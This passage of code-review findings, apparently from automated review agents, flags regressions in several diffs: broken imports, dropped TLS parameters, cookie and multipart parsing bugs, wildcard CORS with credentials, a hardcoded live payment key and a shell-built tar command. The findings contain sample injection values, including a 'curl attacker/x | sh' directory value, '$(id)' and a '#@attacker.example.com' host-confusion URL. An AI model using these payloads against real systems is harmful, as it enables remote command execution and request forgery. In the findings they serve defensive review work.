The repository configuration documentation (pkg/api/config/config.go) explicitly states that 'The three actions are distinct on purpose: an account may be allowed to push new tags without being allowed to delete existing ones.' This separation is now broken: DELETE requests will map to 'push' instead of 'delete', allowing accounts with only push permission to delete resources they should not be able to delete.

findings.title: Unknown methods default to "push" instead of the previous "pull"
findings.body: The removed `default:` arm mapped any method outside the enumerated set (OPTIONS, TRACE, CONNECT, or a malformed verb) to `pull`. With the new inverted condition those methods now require `push`, so read-only clients issuing e.g. a CORS preflight OPTIONS will be denied unless they hold push. Keep the default as `pull` by enumerating the write verbs explicitly rather than negating the read verbs.

findings.title: No test guards DELETE requests now being authorized as 'push'
findings.body: The change removes the explicit case mapping http.MethodDelete to action "delete" and instead maps all non-GET/HEAD methods (including DELETE) to "push". Per the repository's own documented access model (config.go comments: 'an account may be allowed to push new tags without being allowed to delete existing ones'), this is a meaningful behavior change: an account with only push permission would now also be able to delete. No test file is included in this diff, so nothing would fail if this mapping is wrong — a test asserting that a DELETE request resolves to ResourceAction{Action: "delete"} (or that push-only credentials cannot delete) is needed to catch a regression here.

findings.title: Size guard clears the whole cache, discarding the just-fetched entry
findings.body:
The bound check evicts by wiping every entry: once `_CACHE` exceeds 1000 items, `clear()` removes all of them, including the `tenant` inserted two lines above. The caller still gets the returned value, but the very next `get_tenant(tenant_id)` for that same id will miss, and so will 1000 other callers simultaneously — a periodic full-cache flush that turns into a backend load spike every time the threshold is crossed. If the intent was a bounded cache, evict a single entry (or use `collections.OrderedDict`/`functools.lru_cache` semantics) instead of clearing, e.g. pop the oldest key while `len(_CACHE) > 1000`.

_Also raised by the security agent:_ Full cache flush on overflow lets arbitrary keys force backend load

findings.title: A missing/None result from _fetch is written into the shared cache
findings.body: Whatever `_fetch` returns is stored unconditionally. If `_fetch` can return `None` for an unknown or temporarily unavailable tenant, that `None` is now cached and `get_tenant` (line 5) will keep returning `None` for it — indistinguishable from a cache miss and sticky until the cache is flushed. Consider only populating the cache on a truthy/valid result, or storing an explicit negative-cache sentinel with its own expiry.

findings.title: New get_tenant_fresh has no test coverage
findings.body: get_tenant_fresh introduces new behavior: fetching a tenant, storing it in the cache, and clearing the entire cache once it exceeds 1000 entries. No test exercises this function, so a bug (e.g. clearing at the wrong threshold, failing to store the fetched value, or clobbering instead of updating cache entries) would not be caught by any existing test.

findings.title: README documents renamed flag by old name
findings.body: The README at line 7 documents `--workers` as a CLI flag, but cli.py line 6 has renamed it to `--concurrency`. Users following the README documentation would pass an unrecognized flag. Update the README to document the new flag name.

findings.title: Renaming --workers to --concurrency breaks existing callers
findings.body:
`p.add_argument("--workers", ...)` became `p.add_argument("--concurrency", ...)`. Two contracts break at once:

1. Command-line contract: any script, CI job, container CMD or docs-following user passing `--workers 8` now fails with `error: unrecognized arguments: --workers`, since argparse has no fallback for the old name.
2. Code contract: the parsed namespace attribute changes from `args.workers` to `args.concurrency`. Any consumer of `parser()` that reads `args.workers` will raise `AttributeError` at runtime — the diff only touches the parser, so no consumer was updated here.

If the rename is intended, either keep the old spelling as a deprecated alias (`p.add_argument("--concurrency", "--workers", type=int, default=4, dest="concurrency")`) so existing invocations keep working, or update every consumer of `args.workers` in the same change and call out the breaking change. Note also that README line 7 still documents `--workers`, so the shipped documentation now describes a flag that no longer exists.

findings.title: Flag rename has no test verifying the new argument name
findings.body: The --workers flag was renamed to --concurrency but no test file is included in this diff. If code elsewhere still reads args.workers, or if the rename is reverted/typo'd later, nothing would fail. Add or update a test asserting parser().parse_args([...]) exposes `concurrency` and that `--concurrency` is accepted (and `--workers` is not).

findings.title: Docstring contradicts new return type
findings.body: The docstring for `monthly_usage()` states it returns 'the total number of API calls this month as an integer', but the implementation now returns a dictionary mapping day strings to call counts. A caller reading the docstring would expect an integer and likely crash when trying to use the return value. Update the docstring to match the new contract: something like 'Return a dict mapping day to count of API calls for this month.'

findings.title: Return type changed from int to dict without updating callers
findings.body: `monthly_usage` previously returned a scalar integer (`_db.scalar(...)`) and now returns `{day: count}`. Any caller doing arithmetic, comparison or formatting on the result (e.g. `if monthly_usage(a) > limit`) will now silently compare against a dict or raise a TypeError. Either keep the total and add a separate `daily_usage()` function, or update every call site and the docstring on line 2, which still promises "the total number of API calls this month as an integer".

findings.title: No test covers the changed return type/shape of monthly_usage
findings.body: monthly_usage previously returned a scalar int total; it now returns a dict mapping day to count. This is a breaking change to the function's contract (also contradicted by the still-present docstring claiming it returns 'the total number of API calls this month as an integer'). No test file is present in this diff, so nothing would catch a regression such as wrong grouping key, wrong aggregation, or callers still expecting a scalar.

findings.title: Renaming `page_size` to `limit` breaks keyword callers
findings.body: `list_invoices` appears to be a public API entry point. Any existing caller invoking `list_invoices(tenant_id, page_size=100)` will now raise `TypeError: unexpected keyword argument 'page_size'`. Positional callers are unaffected, so this failure will only show up at runtime on the keyword call sites. If the old name must be retired, accept `page_size=None` as a deprecated alias for one release, or confirm every call site passes positionally before merging. No call sites were available in the retrieved context, so this needs verification against the full repository.

findings.title: Docstring still documents the old `page_size` parameter
findings.body:
The signature on line 1 now takes `limit`, but the Args block on line 6 still describes `page_size`. Callers reading the docstring will pass `page_size=...` and get a `TypeError`. Rename the documented argument to `limit`.

_Also raised by the docs agent:_ Docstring references renamed parameter by old name

findings.title: No test exercises list_invoices after parameter rename
findings.body: The parameter page_size was renamed to limit and passed positionally into _query. There is no test in this diff verifying that list_invoices still returns correct paginated results, so a mismatch between the new call signature and _query's expected arguments (e.g., if _query is called elsewhere with keyword page_size, or if callers of list_invoices pass page_size as a keyword) would not be caught.

findings.title: Absolute `from adapters import HTTPAdapter` breaks module import
findings.body: `adapters` is a sibling module inside the `requests` package, but this is an absolute import. On Python 3 (and on Python 2 with `absolute_import` in effect) this raises `ImportError: No module named 'adapters'` at import time of `requests.sessions`, i.e. `import requests` fails entirely. Every other import in this block is relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). Use `from .adapters import HTTPAdapter`.

findings.title: verify/cert silently dropped — TLS settings no longer reach the transport
findings.body:
The new `request()` still accepts `verify` and `cert` (lines 148-149) and `timeout` (line 141), but the body only copies method, url, headers, files, data, params, auth, cookies, allow_redirects, proxies and hooks onto the `Request` (lines 152-163) before calling `self.send(prep)`. `send()` then constructs a bare `HTTPAdapter()` with no arguments and calls `adapter.send(request)` (lines 365-367), so nothing carries the caller's TLS configuration to the transport.

Concretely: a caller doing `session.get(url, verify='/etc/ssl/corp-ca.pem')` or `session.get(url, verify=True)` after this change gets whatever the adapter's hard-coded default is, with no error and no warning. If that default is anything other than full verification, every request over TLS is open to an active man-in-the-middle, and the caller has no way to tell. Client certificates passed via `cert` are likewise never presented, which will silently fail mutual-TLS authentication (or, worse, fall back to an unauthenticated session). `timeout` being dropped additionally means a slow or hostile server can hold a connection open indefinitely.

Either thread `verify`/`cert`/`timeout` through to `adapter.send(...)` (or onto the `PreparedRequest`), or remove them from the signature so the loss is a `TypeError` rather than a silent downgrade. Note also that `self.config`'s `verify`/`cert`/`trust_env` defaults, which `old_request` consulted, are no longer read at all on the live path.

I have not been shown `adapters.HTTPAdapter`, so the default verification behaviour there is unknown — hence the confidence below 0.9 — but the silent discarding of an explicitly supplied security parameter is a defect regardless of that default.

findings.title: `old_request` still calls the deleted `_send_request`
findings.body: `_send_request` was removed in this diff, but the retained `old_request` body still ends with `return self._send_request(r, **args)`. Any call into `old_request` now dies with `AttributeError: 'Session' object has no attribute '_send_request'`. Either keep `_send_request` or delete `old_request` along with it.

findings.title: New `request()` silently discards timeout, verify, cert, prefetch and session state
findings.body: The new `request()` keeps the full public signature but only forwards method/url/headers/files/data/params/auth/cookies/allow_redirects/proxies/hooks onto the `Request` object. `timeout`, `verify`, `cert`, `prefetch`, `config` and `return_response` are accepted and then dropped on the floor, so existing callers doing `session.get(url, timeout=1, verify=False)` get no timeout and full certificate verification anyway — a silent behaviour change rather than an error. It also no longer merges session-level `self.headers`, `self.cookies`, `self.auth`, `self.params` or `self.config` into the request (compare `old_request`, which did), so session state is ignored. `return_response=False` no longer changes the return shape either. Either wire these through to `prepare()`/`send()` or remove them from the signature so the failure is loud.

findings.title: `send()` constructs a fresh HTTPAdapter per request, defeating pooling
findings.body: A new `HTTPAdapter()` is instantiated on every `send()` call. Since each adapter owns its own connection pool, this makes connection reuse across requests in a Session impossible — the main reason to use a Session — and creates/tears down a PoolManager per request. Hold the adapter as session state (built once in `__init__`, closed in `close()`) and reuse it here.

findings.title: `close()` no longer releases pooled connections; `self.poolmanager` never created
findings.body: `init_poolmanager()` and its call from `__init__` were removed, so `self.poolmanager` is never set, and `close()` is now a no-op. Two consequences: (a) `Session.close()` / the `__exit__` path no longer drop pooled sockets, so connections leak for the lifetime of the process; (b) any code that still reads `session.poolmanager` (e.g. the transport/adapter or `models.Request.send`) will now raise `AttributeError`. `PoolManager` is also still imported at line 19 but unused, which suggests the removal was not followed through. If pool ownership is moving to `HTTPAdapter`, `close()` should delegate to the adapter rather than `pass`.

findings.title: Core Session behavior changes ship with no test coverage
findings.body: This diff changes several central behaviors of Session with no accompanying tests: (1) close() at line 132 is reduced to `pass`, silently dropping the PoolManager.clear() call that used to release pooled connections — nothing would fail if this leaks connections; (2) the new request() method (lines 134-167) builds a Request/PreparedRequest and calls self.send(prep) instead of the old _send_request path, and _send_request itself is deleted — nothing exercises this new flow to confirm it returns a proper response; (3) send() (lines 363-367) now instantiates HTTPAdapter() and calls adapter.send(request) instead of request.send() — if HTTPAdapter.send has a different signature or behavior, nothing here would catch it. Since no test file is included in this PR, none of these regressions would be detected by CI.

findings.title: Stale docstring for close() method
findings.body: The `close()` method previously had a docstring describing cleanup of a PoolManager and pooled connections. The method now does nothing (`pass`), but the old docstring was deleted along with the `init_poolmanager()` method. While the docstring is gone, the disconnect between what the method is named to do and what it actually does warrants clarity. Consider either: (1) adding a docstring explaining why `close()` is now a no-op, or (2) removing the method entirely if it serves no purpose.

findings.title: Non-relative `from adapters import HTTPAdapter` is shadowable on sys.path
findings.body:
Every other import in this module uses the explicit relative form (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager` on lines 18-19). Line 22 instead imports a bare top-level name `adapters`. Under absolute-import semantics this resolves against `sys.path`, so any `adapters.py` sitting in the interpreter's working directory or anywhere earlier on the path is imported and executed in place of the library's own module — an import-hijack that gives arbitrary code execution inside every process using this HTTP client, and one that is easy to trip accidentally given how generic the name `adapters` is.

Change it to `from .adapters import HTTPAdapter` to bind it to the package.

findings.title: Malformed Cookie header makes request.cookies None, breaking callers
findings.body:
When `SimpleCookie.load()` raises, the new property sets `self._cookies = None` and returns `None`. Every caller of the property treats it as a mapping: `get_cookie` does `if name in self.request.cookies` (web.py:321), which raises `TypeError: argument of type 'NoneType' is not iterable`, and `clear_all_cookies` does `self.request.cookies.iterkeys()` (web.py:367), which raises `AttributeError`. The previous implementation left `self._cookies` as a (possibly partially loaded) `SimpleCookie` and called `clear_all_cookies()`, so callers always got a mapping. Since a client fully controls the Cookie header, this turns a malformed cookie into a 500 on any handler that reads cookies. Set `self._cookies = Cookie.SimpleCookie()` (an empty cookie jar) in the `except` branch instead of `None`.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies None, crashing all callers

findings.title: RequestHandler.cookies removed without a delegating property
findings.body: `RequestHandler.cookies` was a public, documented attribute used directly by application handlers and templates (`self.cookies[...]`). Deleting it rather than replacing it with a one-line delegate (`@property def cookies(self): return self.request.cookies`) breaks every existing caller outside this repo with an `AttributeError`. Keeping the delegate preserves backwards compatibility at zero cost while still moving the parsing logic to `HTTPRequest`.

findings.title: Cookie parsing/error-handling change on HTTPRequest is untested
findings.body: The cookies property moved from RequestHandler to HTTPRequest, and its error-handling behavior changed: on a malformed Cookie header, it now sets self._cookies = None (line 523) instead of the old behavior of clearing all cookies via clear_all_cookies(). A None value will break get_cookie's 'in' check and clear_all_cookies's iterkeys() call with an AttributeError/TypeError rather than gracefully handling malformed cookies. No test exercises a malformed Cookie header, valid Cookie header parsing, or the interaction between HTTPRequest.cookies and RequestHandler.get_cookie/clear_all_cookies, so this regression would not be caught.

findings.title: boundary parameter never matches due to unstripped whitespace
findings.body: `content_type.split(";")` yields parameter segments that retain the leading space browsers and HTTP clients normally emit, e.g. `" boundary=----WebKitFormBoundaryabc"`. `field.partition("=")` then gives `k == " boundary"`, which fails the `k == "boundary"` test, so `_parse_mime_body` is never called, the `for`/`else` branch fires and every normal multipart upload is logged as "Invalid multipart/form-data" with its files and fields silently dropped. The previous code (`'boundary=' in content_type`) was whitespace-insensitive, so this is a regression for the common case. Fix by normalising each segment: `k, sep, v = field.strip().partition("=")` (and, while there, consider stripping surrounding double quotes from `v`, since RFC 2045 permits `boundary="..."`).

findings.title: No test covers boundary parsing when not last Content-Type field
findings.body: The change fixes a bug where 'boundary' was assumed to be the last field in the Content-Type header. No test in this diff exercises a Content-Type string like 'multipart/form-data; boundary=X; charset=utf-8' (boundary not last) to verify the new parsing loop correctly extracts the boundary and calls _parse_mime_body. If the partition/loop logic regresses (e.g., wrong break condition, whitespace not stripped from 'k'), nothing would fail.

findings.title: get_host authority parsing ignores '?' and '#' delimiters
findings.body:
`get_host` only terminates the authority at `/` (line 92-93). Per RFC 3986 the authority ends at the first of `/`, `?` or `#`. Because `?` and `#` are not handled, a URL such as `http://trusted.example.com#@attacker.example.com/` is parsed as host `attacker.example.com`: line 92 leaves `trusted.example.com#@attacker.example.com` intact (no `/` before the fragment, or the `/` appears after it), and line 94-95 then splits on `@` and keeps the right-hand side. The same happens with `http://trusted.example.com?@attacker.example.com`.

The entry point is not visible in this diff \u2014 `get_host` is a public helper and is used by the connection-pool/redirect machinery, so whether an attacker can supply a URL here depends on callers I was not shown. Where a caller compares or displays a host derived from this function while a connection is actually opened elsewhere (or vice versa), the mismatch is an SSRF / host-confusion primitive. Suggested fix: cut the string at the first `/`, `?` or `#` before doing the `@` and `:` splits.

findings.title: get_host URL parsing logic has no test coverage in this diff
findings.body: get_host contains nontrivial branching (scheme/path/auth/port extraction, port validation raising LocationParseError) but no test file accompanies this change. If the parsing logic were wrong — e.g., mishandling a URL with both '@' and ':' or malformed port — nothing in this diff would catch it.

findings.title: LocationParseError message has an uninterpolated %s
findings.body: `raise LocationParseError("Failed to parse: %s")` never substitutes the URL, so the exception text literally reads `Failed to parse: %s` and callers/log readers lose the only diagnostic that matters. Use `"Failed to parse: %s" % url` (or include the original url before it was chopped up by the splits above, since `url` has already been reduced to the host part at this point).

findings.title: is_connection_dropped returns a list or None instead of a bool
findings.body: The docstring promises `True` if the connection is dropped, but the function has three different return shapes: the `select` branch (line 117) returns the readable-fd *list*, the poll branch returns `True` on a match, and falling off the end of the loop returns `None` implicitly. All three are truthy/falsy in the right direction, so `if is_connection_dropped(c):` works, but any caller doing `is ... True`, `== False`, or serialising the result will misbehave, and the two platform branches are not interchangeable. Suggest `return bool(select([conn.sock], [], [], 0.0)[0])` and an explicit `return False` after the poll loop.

findings.title: make_headers silently discards unicode accept_encoding on Python 2
findings.body: The type dispatch uses `isinstance(accept_encoding, str)`. This module imports `six`, so Python 2 is a supported target; there a `unicode` value such as `u'identity'` matches neither the `str` nor the `list` branch and falls into the `else`, which silently replaces the caller's value with `'gzip,deflate'`. That is a wrong header, not an error. Use `six.string_types` for the string check (and consider `(list, tuple)` for the sequence check, since a tuple of encodings hits the same silent-override path).

findings.title: Invalid `direction` and the 'status' sort key are never exercised
findings.body: The validation raises ValueError for either an unknown `sort` or an unknown `direction`, but the only negative test passes a bad `sort` with the default direction. Nothing calls list_invoices with a bad `direction` (e.g. direction='; DROP') or exercises sort='status', so a regression that stopped validating direction, or a wrong column mapping for 'status', would not be caught.

findings.title: Click description string changed from "click at X" to "click at X, Y"
findings.body: The old branch returned `` `click at ${x}` `` (x only); the new `case "click"` returns `` `click at ${x}, ${y}` ``. This is a change to the returned value, not just to how the union is narrowed, so any caller, snapshot test, log parser or UI label that depends on the old format will now see different text. If including `y` is intentional it should be called out in the description; if not, drop `, ${event.y}` to keep the output identical to before.

findings.title: No test exercises describe() for click/key cases
findings.body: The describe() function's behavior changed (from unsafe type casts to a switch on event.kind), but no test file is included in this diff. If the switch logic were wrong (e.g., wrong property access, missing case, fallthrough bug), nothing would fail. Since no repository test context was retrieved, this is a plausible gap rather than a certainty.

findings.title: HTTPMove.location now returns URL object, not string
findings.body:
The code now assigns `URL(location)` to `self.location` instead of the raw `location` string. The documentation in docs/web_reference.rst states the attribute holds 'the string it was constructed with' and that 'Application code compares it against configured strings and passes it to `str.startswith`'. This is now inaccurate: callers expecting a string will receive a URL object instead, causing `.startswith()` calls to fail with an AttributeError. Either revert this change or update the documentation and potentially add a compatibility layer.

_Also raised by the security agent:_ location type change can silently defeat redirect allow/deny-list checks

_Also raised by the correctness agent:_ `HTTPMove.location` now a URL object, breaking string consumers

findings.title: No test guards location's documented string type
findings.body: self.location now stores a URL object instead of the original string, which contradicts docs/web_reference.rst stating location is 'the string it was constructed with' and that application code calls str.startswith on it. If this behavior is wrong (breaking callers that treat location as a string), no test in this diff would fail, since there's no assertion on the type or string-compatibility of self.location.

findings.title: readany can return empty bytes before EOF after loop removal
findings.body:
`_wait()` documents that the waiter is also resolved at the end of a chunk, possibly with no new data in the buffer, and that "a caller must re-check its condition after waking rather than assuming data arrived." The `while` loop was exactly that re-check. With `if`, a single spurious wake-up falls straight through to `self._read_nowait(-1)` on line 8, which returns an empty result while the stream is neither at EOF nor errored.

Every standard consumer of `readany()` treats a falsy return as end-of-stream (`while True: chunk = await resp.content.readany(); if not chunk: break`), so this silently truncates bodies on chunk boundaries — an intermittent, data-losing failure rather than an exception. Restore the `while` loop so the buffer/EOF condition is re-evaluated after each wake.

_Also raised by the security agent:_ readany() can return empty body early, truncating attacker-timed streams

findings.title: No test covers spurious/no-data wakeups after single wait
findings.body: The docstring for _wait explicitly warns that the waiter can resolve with no new data in the buffer, requiring callers to re-check their condition. Changing the loop to a single `if` removes that re-check, but there is no test exercising a spurious wakeup (e.g. feed_eof called without data, or a wakeup that occurs before data is actually appended) to verify the read now returns correctly or incorrectly under that condition. As written, nothing in the suite would fail if this change causes read() to return early with an empty result.

findings.title: Import statement changed to non-existent module path
findings.body:
The import statement was changed from a relative import (`from .adapters import HTTPAdapter`) to an absolute import (`from adapters import HTTPAdapter`). This changes the import to look for an `adapters` module at the top level of sys.path rather than as a sibling module within the `requests` package. Since `requests/adapters.py` is a package-internal module, not a top-level module, this import will fail at runtime with a ModuleNotFoundError. This is a critical defect that will break the requests library.

_Also raised by the security agent:_ Non-relative `import adapters` allows sys.path module shadowing

findings.title: Implicit relative import breaks module import on Python 3
findings.body: `from adapters import HTTPAdapter` is an implicit relative import. Under Python 3 (and Python 2 with `from __future__ import absolute_import`), this resolves against `sys.path`, not the `requests` package, so it raises `ImportError: No module named 'adapters'` — or, worse, silently binds an unrelated top-level `adapters` module if one happens to be installed. Since `requests/sessions.py` is imported by the package root, this makes `import requests` fail entirely. Restore `from .adapters import HTTPAdapter`.

findings.title: Import change to sessions.py has no test exercising module import
findings.body: The import of HTTPAdapter was changed from a relative import to an absolute one. If this breaks module loading (e.g. under Python 3 or when the package is not on sys.path as a top-level module), nothing in the diff demonstrates this was verified — there is no test file changed alongside this, so any import-time failure would only surface when some other test happens to import requests.sessions.

findings.title: Removed None guard: get_cookie raises TypeError on unparseable Cookie header
findings.body:
`HTTPRequest.cookies` is documented to return `None` when a Cookie header is present but cannot be parsed (see `tornado/httpserver.py`, which returns `None` explicitly when `self._cookies is None`). With the guard removed, `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable` instead of returning `default`. Any request with a malformed Cookie header will turn a benign `get_cookie(...)` call into a 500. Restore the guard (`if self.request.cookies is not None and name in self.request.cookies:`) or have the `cookies` property return an empty dict instead of `None`.

_Also raised by the security agent:_ Removed None guard lets a malformed Cookie header crash any handler

findings.title: Docstring no longer matches implementation behavior
findings.body: The docstring states the method "Gets the value of the cookie with the given name, else default," implying it always succeeds gracefully. However, the implementation on line 3 now directly calls `in` on `self.request.cookies` without the None check that was removed. Per the `tornado/httpserver.py` documentation shown in the context, `request.cookies` can be set to None when the Cookie header cannot be parsed. The caller will now get a TypeError ("argument of type 'NoneType' is not iterable") instead of receiving the default value, contradicting the documented promise.

findings.title: No test covers get_cookie when request.cookies is None
findings.body: The docstring for `cookies` in httpserver.py states it is set to None when the Cookie header is present but unparseable. The removed guard (`self.request.cookies is not None`) protected against that case; now `name in self.request.cookies` would raise TypeError if cookies is None. No test in this diff exercises get_cookie with request.cookies=None, so this regression would not be caught.

findings.title: Dropping .strip() breaks multipart boundary detection
findings.body:
`content_type.split(";")` yields segments that keep the whitespace following the separator, e.g. `"multipart/form-data; boundary=abc"` produces `["multipart/form-data", " boundary=abc"]`. Previously `field.strip()` removed that leading space before `partition("=")`; now `k` is `" boundary"`, so the `k == "boundary"` test on line 5 never matches for the overwhelmingly common (and RFC-conformant, since `;` may be followed by LWS) header form. The result is that `_parse_mime_body` is never called: multipart bodies, including file uploads and form arguments, are silently discarded with no error surfaced to the handler.

Additionally, without `strip()` the value `v` would retain any trailing whitespace/CR, yielding a wrong boundary string even in the no-leading-space case.

Restore `k, sep, v = field.strip().partition("=")` (or strip `k` and `v` individually).

findings.title: Dropping .strip() makes boundary parsing whitespace-dependent
findings.body: `content_type` comes straight from the client's `Content-Type` request header (attacker-controlled), is split on `;`, and each fragment is matched against the literal `"boundary"` before the value reaches the `_parse_mime_body` sink. With `.strip()` removed, the conventional form `multipart/form-data; boundary=abc` yields `k == " boundary"`, which never equals `"boundary"`, so the loop falls through and the body is silently never parsed — arguments and files disappear with no error. Conversely `multipart/form-data;boundary=abc` (no space) still matches, so the *client* now decides whether Tornado parses the body, purely by whitespace placement. That is a parser differential: an upstream proxy, WAF or auth filter that normalises whitespace will see and inspect the multipart fields while Tornado sees none (or vice versa), which is exactly the shape used to slip past request-inspection controls. The unstripped value `v` is also passed through verbatim, so a trailing space or CR in `boundary=abc ` becomes part of the delimiter string handed to `_parse_mime_body`, causing a mismatch against the real body delimiters. Restore `field.strip().partition("=")` (and consider stripping/unquoting `v` as well).

findings.title: No test guards multipart boundary parsing with leading-space fields
findings.body: The change removes `.strip()` before partitioning on '=', so `k` will now include leading whitespace (e.g. ' boundary' instead of 'boundary') for the common header form 'multipart/form-data; boundary=xyz'. This would break the `k == "boundary"` check for the typical case where a space follows the semicolon. No test in this diff exercises `_parse_content_type`/this branch with a realistic header value, so a regression here would not be caught.

findings.title: Error message placeholder left without argument
findings.body: The error message "Failed to parse: %s" contains a format placeholder `%s` but no argument is provided to fill it. This will result in a message like "Failed to parse: %s" being shown to users instead of the actual URL that failed to parse. The previous version included the `url` argument, which was essential diagnostic information. Restore the url argument to make the error message meaningful.

findings.title: No test exercises the malformed error message path
findings.body: The change removes the `% url` argument from `LocationParseError("Failed to parse: %s")`, so when this line executes with a non-digit port it will raise `TypeError: not enough arguments for format string` instead of the intended `LocationParseError`. No test file is included in this diff, so if there is an existing test asserting on the exception type or message for this parse-error path, it's not visible here, and if there isn't one, this regression would ship undetected.

findings.title: Error message keeps `%s` placeholder but loses the interpolation
findings.body: The format argument `% url` was removed while the `%s` placeholder remained in the string, so `LocationParseError` is now raised with the literal text `Failed to parse: %s`. The offending URL is no longer reported, which makes the exception useless for diagnosing bad input and will break any log scraping or test that asserts on the message content. If the intent was to shorten the message, drop the placeholder too (e.g. `LocationParseError(url)` or `"Failed to parse: %s" % url`); do not leave a dangling `%s`.

findings.title: Shell command injection in create_archive via name/directory
findings.body:
`cmd` is built with an f-string from the `name` and `directory` parameters and executed with `shell=True`. Neither value is quoted, escaped, or validated, so any shell metacharacter in either argument is interpreted by the shell. A `directory` of `/tmp; curl attacker/x | sh` or a `name` of `a$(id)` yields arbitrary command execution with the privileges of the process.

Fix by dropping the shell and passing an argument list, as `list_exports` on line 5 already does:

```python
archive = os.path.join("/exports", f"{name}.tar.gz")
subprocess.run(["tar", "-czf", archive, directory], check=True)
```

Even with the list form, `name` should be constrained (e.g. a `^[A-Za-z0-9._-]+$` allowlist, rejecting `..` and `/`) so a caller cannot traverse out of `/exports` and overwrite an arbitrary file, and `directory` should be resolved and confirmed to sit under an expected root.

findings.title: Unquoted interpolation into shell command breaks on spaces/metacharacters
findings.body:
`cmd` is assembled with an f-string and run through `shell=True`, so `name` and `directory` are re-parsed by the shell. Any value containing a space (e.g. `directory="/data/my exports"`) is split into multiple words, and tar receives the wrong arguments — with `check=True` this raises `CalledProcessError`, or worse silently archives the wrong paths. Metacharacters such as `;`, `&`, `$`, `*` or `(` are likewise interpreted rather than treated as literal path text.

Use the argument-list form, matching `list_exports` on line 5:

```python
return subprocess.run(
    ["tar", "-czf", f"/exports/{name}.tar.gz", directory],
    check=True,
)
```

This removes the shell entirely and makes both parameters plain literal arguments.

findings.title: No test coverage for create_archive shell command construction
findings.body: create_archive builds a shell command string via f-string interpolation of `name` and `directory` and executes it with shell=True. There is no test file in this diff, so nothing would verify the command is built correctly, that it handles special characters in `name`/`directory`, or that the subprocess call succeeds/fails as expected. Any future change to the string formatting or argument handling would go unnoticed.

findings.title: Public function `create_archive` lacks parameter documentation
findings.body: The `create_archive` function is missing a docstring explaining what `name` and `directory` parameters represent, whether they are paths, filenames, or require specific formatting. Callers may incorrectly pass values expecting different interpretations — for example, whether `name` should include a path component or only a filename. A docstring clarifying the expected format and any constraints (e.g., that `name` will be embedded in a shell command) would prevent misuse.

findings.title: Wildcard CORS origin combined with credentials bypasses allowlist
findings.body:
`dashboardCors` sets `origin: "*"` while keeping `credentials: true`, in contrast to the existing export on lines 6-7 which restricts to `ALLOWED`. Whatever routes this middleware is mounted on accept cross-origin requests from every site on the internet, and the intent of `credentials: true` is that the browser attach the user's cookies/`Authorization` header to those requests.

Two concrete risks:

1. If any layer of this stack reflects the request `Origin` instead of emitting a literal `*` (many wrappers and proxies do, and the `cors` package does so as soon as `origin` is later changed to `true` or a function), then any attacker-controlled page can issue authenticated, credentialed requests to the dashboard API in a logged-in victim's browser and read the responses — full cross-site account takeover of dashboard data.
2. Even where the browser emits a literal `*` and therefore refuses to send credentials, every non-credentialed dashboard response becomes readable by arbitrary origins, which removes the same-origin protection on anything authenticated by IP, network position, or a bearer token held by an intermediary.

Fix: reuse `ALLOWED` (or a dashboard-specific allowlist of exact origins) for this export. Never pair a wildcard origin with `credentials: true`; if the dashboard endpoints are genuinely public, set `credentials: false` so the combination cannot be silently upgraded into a reflecting configuration later.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
The `cors` package emits a literal `Access-Control-Allow-Origin: *` when `origin` is the string `"*"`. The Fetch/CORS specification forbids the wildcard value on responses to credentialed requests, so any browser request made with `credentials: 'include'` (cookies, `Authorization` via credentials mode) will be blocked by the user agent and the response discarded — the dashboard this was added for will see opaque CORS failures, not a working API. The `credentials: true` flag here is therefore both ineffective and misleading.

If the dashboard genuinely needs credentialed cross-origin access, `origin` must echo a specific, validated origin (e.g. a function or explicit allow-list like the existing `ALLOWED` on line 6) so that `Access-Control-Allow-Origin` carries a concrete origin and `Vary: Origin` is set. If credentials are not actually needed, drop `credentials: true` and the wildcard will work.

Note also that reflecting arbitrary origins *with* credentials would let any site read authenticated responses, so the fix should be a bounded allow-list rather than a blanket reflector.

findings.title: Public CORS config with contradictory settings lacks documentation
findings.body: The exported `dashboardCors` constant sets `origin: "*"` (allow all origins) while also setting `credentials: true` (allow credentials). This combination is invalid: browsers will reject requests with credentials when `Access-Control-Allow-Origin` is `*`. A caller reading this code cannot tell whether this is intentional (and the credentials flag will be ignored), a configuration error, or a partial implementation. Add a comment or docstring explaining the intended behaviour, or fix the configuration.

findings.title: New CORS config has no test verifying its behavior
findings.body: dashboardCors combines origin: "*" with credentials: true, which is an invalid/rejected combination per the CORS spec (browsers ignore Access-Control-Allow-Credentials when origin is a wildcard). There is no test exercising this exported config, so a misconfiguration like this would silently ship and nothing in the suite would fail.

findings.title: Live AcmePay secret key hardcoded in source
findings.body:
`ACMEPAY_SECRET_KEY` is a literal `acme_live_...` credential committed to the repository, replacing the previous `os.environ["ACMEPAY_SECRET_KEY"]` lookup. Anyone with read access to the repo (or to any clone, CI log, build artifact, or mirror) obtains a production payments credential capable of moving money. It also removes the ability to rotate the key without a code deploy.

Actions: (1) treat this key as compromised and rotate it at the provider immediately; (2) restore the environment-variable (or secret-manager) lookup; (3) purge the value from git history, since reverting the commit leaves it readable in the log.

findings.title: Hardcoded live key removes per-environment configuration
findings.body: `client()` previously read `ACMEPAY_SECRET_KEY` from the environment, which is what allowed each deployment to point at its own AcmePay account. After this change the module-level constant is bound at import time and there is no override path at all, so dev machines, CI runs and staging now all authenticate with a key whose prefix (`acme_live_`) indicates the production account — meaning test charges and refunds execute against real money. Restore the environment lookup (optionally with a non-live default) rather than baking the value into the source.

findings.title: No test verifies client() sets api_key correctly
findings.body: The diff changes client() to assign acmepay.api_key from a hardcoded module constant instead of os.environ['ACMEPAY_SECRET_KEY']. Only tests/fixtures/acmepay.py was added, which defines a fixture (fake_client/TEST_KEY) but contains no assertions and is not a test itself. If client() were reverted, broken, or wired to the wrong constant, nothing in this PR would catch it.

findings.title: fake_client() return shape does not match client()
findings.body: `client()` returns the `acmepay` module, whose key is read as the attribute `acmepay.api_key`. `fake_client()` returns a plain dict, so code substituting it will need `result["api_key"]` and any call to a module function (e.g. `client().charge(...)`) will raise `TypeError`/`KeyError` instead of exercising the real interface. Return a stub object exposing `api_key` as an attribute, or a `MagicMock`, so the fixture is a drop-in for the real return value.

findings.title: tenant_of returns an unauthenticated, forgeable tenant id
findings.body:
